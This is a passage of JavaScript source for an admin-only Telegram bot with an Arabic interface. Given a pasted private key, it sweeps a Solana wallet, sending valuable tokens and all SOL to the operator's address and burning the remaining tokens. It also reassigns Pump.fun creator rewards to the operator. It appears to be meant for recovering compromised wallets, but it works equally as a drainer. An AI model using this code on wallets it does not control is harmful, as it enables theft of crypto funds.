    targetAccount.pubkey, mintPubkey, destAta, compromisedKeypair.publicKey, transferAmt, decimals, [], progId
  ));

  await sendAndConfirm(connection, tx, [feePayerKeypair, compromisedKeypair]);

  return {
    success: true,
    solRecovered: "0.00000",
    pubkey: feePayerKeypair.publicKey.toBase58()
  };
}

// ──────────────────────────────────────────────────────────
// 3. خادم Express والبوت
// ──────────────────────────────────────────────────────────

const userState = new Map();
const selfBurnKeys = new Map();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
let botReady = false;
app.get("/", (_req, res) => res.status(200).send("ok"));
app.get("/health", (_req, res) => res.status(200).json({ ok: true, botReady }));

const WEBHOOK_URL = process.env.WEBHOOK_URL; // مثال: https://your-app.up.railway.app
const WEBHOOK_PATH = "/tg-webhook";
const WEBHOOK_SECRET = (BOT_TOKEN || "").replace(/[^A-Za-z0-9_-]/g, "").slice(-40);

app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server listening on port ${PORT}`);
  setImmediate(() => startBot().catch((e) => console.error("startBot failed:", e?.message || e)));
  setTimeout(() => loadPump().catch(() => {}), 2000);
});

async function startBot() {
  if (!BOT_TOKEN) { console.error("❌ TELEGRAM_BOT_TOKEN غير موجود"); return; }
  const bot = new Bot(BOT_TOKEN);

  bot.api.config.use(async (prev, method, payload, signal) => {
    try {
      return await prev(method, payload, signal);
    } catch (err) {
      const description = err?.description || err?.message || "";
      const isParseErr =
        (method === "sendMessage" || method === "editMessageText") &&
        payload?.parse_mode &&
        /can'?t parse entities/i.test(description);
      if (isParseErr) {
        console.warn(`⚠️ parse failed (${description}) — resending as plain text.`);
        const { parse_mode, ...rest } = payload;
        return await prev(method, rest, signal);
      }
      throw err;
    }
  });

  bot.catch((err) => {
    const msg = err?.error?.message || err?.message || String(err);
    if (msg.includes("409")) {
      console.warn("⚠️ 409 Conflict caught by bot.catch — ignored (retry handles it).");
      return;
    }
    console.error("Telegram Bot Error:", msg);
  });


  try {
    await bot.api.setMyCommands([
      { command: "start",    description: "بدء البوت والقائمة الرئيسية" },
      { command: "delegate", description: "نقل تفويض مكافآت المنشئ (Pump.fun)" },
    ]);
    console.log("📋 Bot commands registered.");
  } catch (e) {
    console.warn("⚠️ Failed to register bot commands:", e.message);
  }

  bot.use(async (ctx, next) => {
    const fromId = ctx.from?.id;
    if (fromId && ADMIN_IDS.includes(fromId)) {
      return next();
    }
  });

  const mainKeyboard = new InlineKeyboard()
    .text("نقل التوكنات", "transfer_tokens")
    .text("حرق 🔥", "burn_tokens")
    .row()
    .text("🧨 حرق محفظة خاصة", "self_burn")
    .text("📝 تفويض", "delegate_transfer");

  bot.command("start", async (ctx) => {
    userState.delete(ctx.from.id);
    selfBurnKeys.delete(ctx.from.id);
    await ctx.reply(
      "أهلاً بك! اختر إحدى العمليات التالية:\n\n" +
      "• /delegate — نقل تفويض مكافآت المنشئ",
      { reply_markup: mainKeyboard }
    );
  });

  // ── أمر /delegate — نقل تفويض مكافآت المنشئ ──
  bot.command("delegate", async (ctx) => {
    userState.set(ctx.from.id, { awaitingDelegateMint: true });
    const recipientAddr = getFeePayerAddress();
    const creatorAddr   = getCreatorAddress();
    await ctx.reply(
      "📝 أرسل عنوان عقد التوكن (Mint) الخاص بعملة Pump.fun.\n\n" +
      "سيتم نقل تفويض استلام 100% من مكافآت المنشئ إلى المحفظة التالية:\n" +
      `📥 المستلم: ${recipientAddr}\n` +
      `👤 الموقّع كمنشئ: ${creatorAddr}`
    );
  });

  bot.callbackQuery("transfer_tokens", async (ctx) => {
    userState.delete(ctx.from.id);
    await ctx.answerCallbackQuery();
    await ctx.reply("⏳ جاري تنفيذ عملية نقل التوكنات...");

    try {
      const res = await executeTransferTokens();
      if (res.success) {
        await ctx.reply(`✅ تم التنفيذ بنجاح!\n\n💎 إجمالي SOL المستعاد: ${res.solRecovered} SOL\n📍 المحفظة: ${res.pubkey}`);
      } else {
        await ctx.reply(`❌ فشلت العملية: ${res.msg}`);
      }
    } catch (err) {
      await ctx.reply("❌ حدث خطأ أثناء تنفيذ النقل.");
    }
  });

  bot.callbackQuery("burn_tokens", async (ctx) => {
    userState.delete(ctx.from.id);
    await ctx.answerCallbackQuery();
    await ctx.reply("⏳ جاري استعلام أسعار التوكنات من Jupiter و DexScreener و Raydium...");

    try {
      const preview = await analyzeBurnPreview();
      if (!preview.success) { await ctx.reply(`❌ ${preview.msg}`); return; }

      userState.set(ctx.from.id, { burnPreview: { stage: 1, valuableCount: preview.valuable.length, burnableCount: preview.burnable.length } });

      let msg = `📊 تحليل المحفظة:\n\n`;
      msg += `🔥 قابلة للحرق (< $${VALUE_THRESHOLD_USD}): ${preview.burnable.length} حساب\n`;
      msg += `💰 قيّمة (لن تُحرق): ${preview.valuable.length} حساب\n`;
      if (preview.valuable.length > 0) {
        msg += `\n⚠️ توكنات كبيرة لن يتم حرقها:\n${formatValuableList(preview.valuable)}\n`;
      }
      msg += `\n⚠️ هل تريد المتابعة؟ (تأكيد أول)`;

      const kb = new InlineKeyboard()
        .text("✅ تأكيد أول", "burn_confirm1")
        .text("إلغاء", "cancel_burn");
      await ctx.reply(msg, { reply_markup: kb });
    } catch (err) {
      console.error(err);
      await ctx.reply("❌ حدث خطأ أثناء التحليل.");
    }
  });

  bot.callbackQuery("burn_confirm1", async (ctx) => {
    await ctx.answerCallbackQuery();
    const st = userState.get(ctx.from.id);
    if (!st?.burnPreview) { await ctx.reply("انتهت الجلسة. ابدأ من جديد."); return; }
    st.burnPreview.stage = 2;
    userState.set(ctx.from.id, st);

    const kb = new InlineKeyboard()
      .text("🔥 تأكيد نهائي", "burn_confirm2")
      .text("إلغاء", "cancel_burn");
    await ctx.reply(
      `⚠️ تأكيد ثانٍ ونهائي\n\nسيتم حرق ${st.burnPreview.burnableCount} حساب فقط.\nالتوكنات القيّمة (${st.burnPreview.valuableCount}) لن تُحرق.`,
      { reply_markup: kb }
    );
  });

  bot.callbackQuery("burn_confirm2", async (ctx) => {
    await ctx.answerCallbackQuery();
    userState.delete(ctx.from.id);
    await ctx.reply("⏳ جاري تنفيذ الحرق والإغلاق...");
    try {
      const res = await executeBurnAndClose();
      if (res.success) {
        await ctx.reply(
          `✅ تم الحرق بنجاح!\n\n💎 SOL المستعاد: ${res.solRecovered} SOL\n💰 تم تخطي ${res.skipped || 0} توكن قيّم\n📍 ${res.pubkey}`
        );
      } else {
        await ctx.reply(`❌ فشل: ${res.msg}`);
      }
    } catch (err) {
      console.error(err);
      await ctx.reply("❌ حدث خطأ أثناء الحرق.");
    }
  });

  bot.callbackQuery("cancel_burn", async (ctx) => {
    userState.delete(ctx.from.id);
    selfBurnKeys.delete(ctx.from.id);
    await ctx.answerCallbackQuery();
    await ctx.reply("❌ تم الإلغاء.", { reply_markup: mainKeyboard });
  });

  bot.callbackQuery("self_burn", async (ctx) => {
    userState.set(ctx.from.id, { awaitingKey: true });
    await ctx.answerCallbackQuery();
    const destAddr = getFeePayerAddress();
    await ctx.reply(
      "🔑 أرسل المفتاح الخاص للمحفظة المستهدفة (Base58 أو JSON array بطول 64 بايت).\n\n" +
      "سيتم:\n" +
      `• تحويل التوكنات التي قيمتها > $${VALUE_THRESHOLD_USD} إلى المحفظة: ${destAddr}\n` +
      "• حرق وإغلاق باقي التوكنات\n" +
      `• تحويل كامل رصيد SOL إلى: ${destAddr}\n` +
      "• الرسوم كلها من المحفظة نفسها"
    );
  });

  bot.callbackQuery("delegate_transfer", async (ctx) => {
    userState.set(ctx.from.id, { awaitingDelegateMint: true });
    await ctx.answerCallbackQuery();
    const recipientAddr = getFeePayerAddress();
    const creatorAddr   = getCreatorAddress();
    await ctx.reply(
      "📝 أرسل عنوان عقد التوكن (Mint) الخاص بعملة Pump.fun.\n\n" +
      "سيتم نقل تفويض استلام 100% من مكافآت المنشئ إلى المحفظة التالية:\n" +
      `📥 المستلم: ${recipientAddr}\n` +
      `👤 الموقّع كمنشئ: ${creatorAddr}`
    );
  });

  bot.callbackQuery("self_burn_confirm1", async (ctx) => {
    await ctx.answerCallbackQuery();
    const st = userState.get(ctx.from.id);
    if (!st?.selfBurn) { await ctx.reply("انتهت الجلسة. ابدأ من جديد."); return; }
    st.selfBurn.stage = 2;
    userState.set(ctx.from.id, st);
    const destAddr = getFeePayerAddress();
    const kb = new InlineKeyboard()
      .text("🧨 تأكيد نهائي", "self_burn_confirm2")
      .text("إلغاء", "cancel_burn");
    await ctx.reply(
      `⚠️ تأكيد ثانٍ ونهائي\n\n` +
      `• سيُحوَّل ${st.selfBurn.valuableCount} توكن قيّم إلى ${destAddr} (لن يُحرق).\n` +
      `• سيُحرق ${st.selfBurn.burnableCount} توكن.\n` +
      `• سيُحوَّل كامل SOL إلى ${destAddr}.\n\nهل تريد المتابعة؟`,
      { reply_markup: kb }
    );
  });

  bot.callbackQuery("self_burn_confirm2", async (ctx) => {
    await ctx.answerCallbackQuery();
    const st = userState.get(ctx.from.id);
    const kp = selfBurnKeys.get(ctx.from.id);
    userState.delete(ctx.from.id);
    selfBurnKeys.delete(ctx.from.id);
    if (!st?.selfBurn || !kp) { await ctx.reply("انتهت الجلسة. ابدأ من جديد."); return; }

    await ctx.reply("⏳ جاري التنفيذ...");
    try {
      const res = await executeSelfBurnAndDrain(kp);
      if (res.success) {
        await ctx.reply(
          `✅ تم بنجاح!\n\n` +
          `💸 توكنات محوّلة: ${res.transferredCount}\n` +
          `🔥 توكنات محروقة: ${res.burnedCount}\n` +
          `💎 SOL محوّل: ${res.solTransferredSOL} SOL\n` +
          `📤 من: ${res.sourcePubkey}\n` +
          `📥 إلى: ${res.destinationPubkey}`
        );
      } else {
        await ctx.reply(`❌ فشل: ${res.msg}`);
      }
    } catch (err) {
      console.error(err);
      await ctx.reply("❌ حدث خطأ أثناء التنفيذ.");
    }
  });

  bot.on("message:text", async (ctx) => {
    const text = ctx.message.text.trim();
    const userId = ctx.from.id;
    const state = userState.get(userId);

    if (state?.awaitingDelegateMint) {
      if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text)) {
        await ctx.reply("❌ عنوان توكن غير صالح. أعد الإرسال أو اضغط /start للإلغاء.");
        return;
      }
      userState.delete(userId);
      await ctx.reply(`⏳ جاري نقل التفويض للتوكن:\n${text}`);
      try {
        const res = await executeDelegateTransfer(text);
        if (res.success) {
          await ctx.reply(
            `✅ تم نقل التفويض بنجاح!\n\n` +
            `🪙 العملة: ${res.mint}\n` +
            `👤 المنشئ (الموقّع): ${res.creator}\n` +
            `📥 المستلم 100%: ${res.recipient2}\n` +
            `💸 دافع الرسوم (رسوم فقط): ${res.recipient}\n` +
            `🔗 https://solscan.io/tx/${res.sig}`
          );
        } else {
          await ctx.reply(`❌ فشل نقل التفويض:\n${res.msg}`);
        }
      } catch (err) {
        console.error(err);
        await ctx.reply(`❌ حدث خطأ أثناء نقل التفويض:\n${String(err?.message || err).slice(0, 300)}`);
      }
      return;
    }

    if (state?.awaitingKey) {
      const kps = extractValidKeypairs(text);
      if (kps.length === 0) {
        await ctx.reply("❌ مفتاح غير صالح. أرسل مفتاح Base58 أو JSON array صحيح.");
        return;
      }
      const kp = kps[0];
      try { await ctx.deleteMessage(); } catch {}

      await ctx.reply(`🔍 تم تحميل المحفظة: ${kp.publicKey.toBase58()}\n\n⏳ جاري استعلام الأسعار وتحليل الحسابات...`);

      try {
        const preview = await analyzeSelfBurnPreview(kp);
        selfBurnKeys.set(userId, kp);
        userState.set(userId, {
          selfBurn: {
            stage: 1,
            valuableCount: preview.valuable.length,
            burnableCount: preview.burnable.length,
          },
        });

        const destAddr = getFeePayerAddress();
        let msg = `📊 تحليل المحفظة المستهدفة:\n\n`;
        msg += `📍 ${kp.publicKey.toBase58()}\n`;
        msg += `💰 SOL: ${(preview.solLamports / 1e9).toFixed(6)}\n`;
        msg += `🔥 قابلة للحرق (< $${VALUE_THRESHOLD_USD}): ${preview.burnable.length}\n`;
        msg += `💎 قيّمة (ستُحوَّل إلى ${destAddr}): ${preview.valuable.length}\n`;
        if (preview.valuable.length > 0) {
          msg += `\n⚠️ توكنات كبيرة لن يتم حرقها (سيتم تحويلها):\n${formatValuableList(preview.valuable)}\n`;
        }
        msg += `\n⚠️ هل تريد المتابعة؟ (تأكيد أول)`;

        const kb = new InlineKeyboard()
          .text("✅ تأكيد أول", "self_burn_confirm1")
          .text("إلغاء", "cancel_burn");
        await ctx.reply(msg, { reply_markup: kb });
      } catch (err) {
        console.error(err);
        selfBurnKeys.delete(userId);
        userState.delete(userId);
        await ctx.reply("❌ فشل التحليل: " + String(err?.message || "خطأ غير معروف").slice(0, 200));
      }
      return;
    }

    if (state?.mintAddress) {
      const { mintAddress } = state;
      const percentage = parseFloat(text);

      if (isNaN(percentage) || percentage <= 0 || percentage > 100) {
        await ctx.reply("❌ يرجى إدخال نسبة مئوية صالحة بين 1 و 100.");
        return;
      }

      userState.delete(userId);
      await ctx.reply(`⏳ جاري نقل ${percentage}% من التوكن...`);

      try {
        const res = await executeCustomTransfer(mintAddress, percentage);
        if (res.success) {
          await ctx.reply(`✅ تم نقل النسبة بنجاح!\n\n💎 إجمالي SOL المستعاد: ${res.solRecovered} SOL\n📍 المحفظة: ${res.pubkey}`);
        } else {
          await ctx.reply(`❌ فشل: ${res.msg}`);
        }
      } catch (e) {
        await ctx.reply("❌ حدث خطأ أثناء تنفيذ النقل المخصص.");
      }
      return;
    }

    if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text)) {
      try {
        const compromisedKeypair = loadKeypair(COMPROMISED_PRIVATE_KEY);
        if (!compromisedKeypair) {
          await ctx.reply("❌ المفتاح غير متوفر.");
          return;
        }

        const connection = getSendConn();
        const [tokenAccounts, token2022Accounts] = await Promise.all([
          getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_PROGRAM_ID),
          getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_2022_PROGRAM_ID),
        ]);

        const hasToken = [...tokenAccounts, ...token2022Accounts].some(
          a => a.account.data.parsed?.info?.mint === text
        );

        if (hasToken) {
          userState.set(userId, { mintAddress: text });
          await ctx.reply("✅ التوكن موجود في المحفظة!\nيرجى كتابة النسبة المئوية المراد نقلها (مثال: 30):");
        } else {
          await ctx.reply("❌ التوكن غير موجود داخل المحفظة.");
        }
      } catch (err) {
        await ctx.reply("❌ حدث خطأ أثناء البحث عن التوكن.");
      }
    }
  });

  if (WEBHOOK_URL) {
    // وضع الويبهوك: لا يوجد 409 نهائياً
    const { webhookCallback } = await import("grammy");
    app.post(WEBHOOK_PATH, webhookCallback(bot, "express", { secretToken: WEBHOOK_SECRET }));
    await bot.init();
    await bot.api.setWebhook(WEBHOOK_URL.replace(/\/$/, "") + WEBHOOK_PATH, {
      secret_token: WEBHOOK_SECRET,
      drop_pending_updates: true,
      allowed_updates: ["message", "callback_query"],
    });
    botReady = true;
    console.log("🤖 Telegram Bot started via Webhook.");
    return;
  }

  // وضع Long Polling مع إيقاف نظيف عند إعادة النشر
  const shutdown = async (sig) => {
    console.log(`${sig} received — stopping bot cleanly...`);
    try { await bot.stop(); } catch {}
    process.exit(0);
  };
  process.once("SIGTERM", () => shutdown("SIGTERM"));
  process.once("SIGINT", () => shutdown("SIGINT"));

  const startBotWithRetry = async (attempt = 1) => {
    try {
      await bot.api.deleteWebhook({ drop_pending_updates: true }).catch(() => {});
      await bot.start({
        drop_pending_updates: true,
        onStart: () => { botReady = true; console.log("🤖 Telegram Bot started via Long Polling successfully!"); },
      });
    } catch (err) {
      const code = err?.error_code;
      if (code === 409) {
        const wait = Math.min(attempt * 5000, 60000);
        console.warn(`⚠️ 409: نسخة أخرى تعمل. إعادة المحاولة ${attempt} بعد ${wait / 1000}ث...`);
        setTimeout(() => startBotWithRetry(attempt + 1), wait);
        return;
      }
      console.error("Bot start failed:", err?.message || err);
      setTimeout(() => startBotWithRetry(attempt + 1), 10000);
    }
  };
  startBotWithRetry();
}
